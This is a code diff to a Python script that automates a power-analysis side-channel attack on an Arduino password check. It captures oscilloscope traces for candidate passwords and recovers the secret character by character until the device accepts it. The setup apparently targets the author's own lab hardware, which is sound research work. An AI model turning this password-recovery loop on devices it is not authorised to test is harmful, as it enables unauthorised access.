@@ -7,6 +7,7 @@ import numpy as np
 import threading
 from time import sleep
 import os
+from Analysis.analysis import Analyser
 
 """-----------------------------------------------------------------------"""
 
@@ -60,9 +61,9 @@ def generate_password_for_position(position, hypothesis_char, length, charset):
     
     return ''.join(password)
 
-def generate_dpa_passwords(target_length, charset_choice, num_traces_per_char):
+def generate_dpa_passwords(target_length, charset_choice, num_traces_per_char, known_password):
     """
-    Generate passwords for DPA attack on string comparison
+    Generate passwords for DPA attack on string comparison (Out of date use analy.)
     
     Args:
         target_length: Length of the secret password
@@ -82,25 +83,26 @@ def generate_dpa_passwords(target_length, charset_choice, num_traces_per_char):
     }
     charset = CHARSETS[charset_choice]
 
+    known_password = known_password
+    position = len(known_password)
     passwords = []
     
-    testset = ''
+    for char in charset:
+        for trace_num in range(num_traces_per_char):
+            password = known_password + char
 
-    # For each position in the password
-    for position in range(target_length):
-        # For each possible character at this position
-        for char in charset:
-            # Generate multiple traces with this character at this position
-            for trace_num in range(num_traces_per_char):
-                # Build password: known prefix + hypothesis char + random suffix
-                password = generate_password_for_position(position, char, target_length, charset)
-                passwords.append(password)
-    
+            for i in range(position +1, target_length):
+                password += random.choice(charset)
+
+            passwords.append(password)
     return passwords
 
 try:
+    #Initalise analyser
+    analy = Analyser()
+    
     os.makedirs('traces', exist_ok=True)
-
+    found = False
     # Load WaveForms DWF library (needed for clock control)
     dwf = load_dwf()
     
@@ -109,8 +111,6 @@ try:
     sleep(2)
     ser.reset_input_buffer()
 
-    passwords = generate_dpa_passwords(11, 1, 8)
-
     #Opening device
     device_data = device.open()
     hdwf = device_data.handle
@@ -118,100 +118,116 @@ try:
     clock_start(dwf, hdwf)
     print('Starting clock')
     sleep(10)
-
-    # ── Main capture loop ────────────────────────────────────────────────────
-    for i, password in enumerate(passwords):
-        # ser.reset_input_buffer()
-        print(f"\n[{i+1}/{len(passwords)}] password: {password}")
-
-        # Start oscilloscope
-        scope.open(device_data,
-                   sampling_frequency=100e6,
-                   buffer_size=8192,
-                   offset=0,
-                   amplitude_range=6)
-
-        # Arm trigger — rising edge on CH2 at 3 V (your trigger line)
-        scope.trigger(device_data,
-                      enable=True,
-                      source=scope.trigger_source.analog,
-                      channel=2,
-                      level=3,
-                      timeout=3)
-
-        # Wait for Arduino prompt
-        print("  waiting for Arduino prompt …")
-        response = ""
-        while True:
-            response += ser.read().decode(errors='ignore')
-            print('.' + response)
-            if "Enter Password:" in response:
-                print("\n  Arduino ready")
-                break
-
-        buffer_holder = [None]
-
-        def record():
-            buffer_holder[0] = scope.record(device_data, channel=1)
-
-        t = threading.Thread(target=record)
-        t.start()
-        sleep(0.1)
-
-        # Send password & collect trace
-        ser.write((password + '\n').encode())
     
-        #Reading response
-        arduino_resp = ser.readline()
+    # ── Main capture loop ────────────────────────────────────────────────────
+    while found != True:
+        known = analy.known_password
+        print(f"We know: {known}")
+        passwords = generate_dpa_passwords(11, 1, 8, known)
+        print(f"Generated {len(passwords)} passwords")
+        for i, password in enumerate(passwords):
+            # ser.reset_input_buffer()
+            print(f"\n[{i+1}/{len(passwords)}] password: {password}")
 
-        #Print response
-        print(f"  Arduino: {arduino_resp.strip()}")
+            # Start oscilloscope
+            scope.open(device_data,
+                       sampling_frequency=100e6,
+                       buffer_size=8192,
+                       offset=0,
+                       amplitude_range=6)
 
-        #Waiting for thread to finish
-        t.join(timeout=5)
-        if t.is_alive():
-            print(f"  [!] trace {i} timed out — skipping")
+            # Arm trigger — rising edge on CH2 at 3 V (your trigger line)
+            scope.trigger(device_data,
+                          enable=True,
+                          source=scope.trigger_source.analog,
+                          channel=2,
+                          level=3,
+                          timeout=3)
+
+            # Wait for Arduino prompt
+            print("  waiting for Arduino prompt …")
+            response = ""
+            while True:
+                response += ser.read().decode(errors='ignore')
+                print('.' + response)
+                if "Password OK" in response: 
+                    print(f"\n Found the password {passwords[i-1]}")
+                    correct_password = passwords[i-1]
+                    found = True
+                    break
+                if "Enter Password:" in response:
+                    print("\n  Arduino ready")
+                    break
+            if found:
+                break
+            buffer_holder = [None]
+
+            def record():
+                buffer_holder[0] = scope.record(device_data, channel=1)
+
+            t = threading.Thread(target=record)
+            t.start()
+            sleep(0.1)
+
+            # Send password & collect trace
+            ser.write((password + '\n').encode())
+        
+            #Reading response
+            arduino_resp = ser.readline()
+
+            #Print response
+            print(f"  Arduino: {arduino_resp.strip()}")
+
+            #Waiting for thread to finish
+            t.join(timeout=5)
+            if t.is_alive():
+                print(f"  [!] trace {i} timed out — skipping")
+                scope.close(device_data)
+                sleep(0.5)
+                continue
+
+            # Process & save 
+            buffer = buffer_holder[0]
+
+            # Keep only the post-trigger half
+            trigger_idx = len(buffer) // 2
+            buffer = buffer[trigger_idx:]
+
+            print(f"  samples captured: {len(buffer)}")
+
+            np.savez(f'traces/trace{i}.npz',
+                     buffer=buffer,
+                     password=np.frombuffer(password.encode(), dtype=np.uint8))
+
+            # Plot
+            time_axis = [s * 1e3 / scope.data.sampling_frequency
+                         for s in range(len(buffer))]
+            plt.figure()
+            plt.xlim(0, 0.022)
+            # plt.ylim(3.3, 4)
+            plt.plot(time_axis, buffer,
+                     color='#2196F3', linewidth=0.5, alpha=0.8)
+            plt.title(f'Post-trigger trace {i}')
+            plt.xlabel(f"time [ms]  —  pass: {password}")
+            plt.ylabel("voltage [V]")
+            plt.savefig(f'trace_png/test_trace{i}', dpi=250)
+            plt.close()
+
+            #Reset scope buffer locally
+            dwf.FDwfAnalogInReset(hdwf)
+
+            # Tear down for this iteration
             scope.close(device_data)
-            sleep(0.5)
-            continue
 
-        # Process & save 
-        buffer = buffer_holder[0]
+            #Empty buffer variable just to be safe
+            buffer = None
+        if found:
+            break
+        analy.load_new_traces('traces')
+        analy.dpa()
+        analy.plotschat()
 
-        # Keep only the post-trigger half
-        trigger_idx = len(buffer) // 2
-        buffer = buffer[trigger_idx:]
-
-        print(f"  samples captured: {len(buffer)}")
-
-        np.savez(f'traces/trace{i}.npz',
-                 buffer=buffer,
-                 password=np.frombuffer(password.encode(), dtype=np.uint8))
-
-        # Plot
-        time_axis = [s * 1e3 / scope.data.sampling_frequency
-                     for s in range(len(buffer))]
-        plt.figure()
-        plt.xlim(0, 0.022)
-        # plt.ylim(3.3, 4)
-        plt.plot(time_axis, buffer,
-                 color='#2196F3', linewidth=0.5, alpha=0.8)
-        plt.title(f'Post-trigger trace {i}')
-        plt.xlabel(f"time [ms]  —  pass: {password}")
-        plt.ylabel("voltage [V]")
-        plt.savefig(f'test_trace{i}', dpi=250)
-        plt.close()
-
-        #Reset scope buffer locally
-        dwf.FDwfAnalogInReset(hdwf)
-
-        # Tear down for this iteration
-        scope.close(device_data)
-
-        #Empty buffer variable just to be safe
-        buffer = None
-
-    print("\n[done] all traces captured")
+    print(f"\nDPA done: found password: {correct_password}")
     clock_stop(dwf, hdwf)
 except error as e:
     print(e)
